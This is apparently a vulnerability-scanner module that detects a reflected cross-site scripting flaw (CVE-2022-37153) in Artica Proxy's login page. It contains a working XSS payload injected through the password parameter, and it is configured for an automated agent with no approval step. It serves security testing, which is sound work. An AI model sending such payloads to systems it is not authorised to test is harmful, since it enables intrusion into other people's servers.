#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Artica Proxy 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Artica Proxy 4.30.000000 - Cross-Site Scripting Detection',
        'description': 'Artica Proxy 4.30.000000 contains a cross-site scripting vulnerability via the password parameter in /fw.login.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'xss', 'artica', 'articatech', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/Fjowel/CVE-2022-37153',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-37153',
            'https://github.com/SYRTI/POC_to_review',
            'https://github.com/WhooAmii/POC_to_review',
            'https://github.com/k0mi-tg/CVE-POC',
        ],
        'cve': 'CVE-2022-37153',
    }

    def run(self):
        path = '/fw.login.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='userfont=&artica-language=&StandardDropDown=&HTMLTITLE=&username=admin&password=admin%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('Password" value="admin"><script>alert(document.domain)</script>', 'Artica Web',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Artica Proxy 4.30.000000 - Cross-Site Scripting detected', path=path)
            return True
        return False

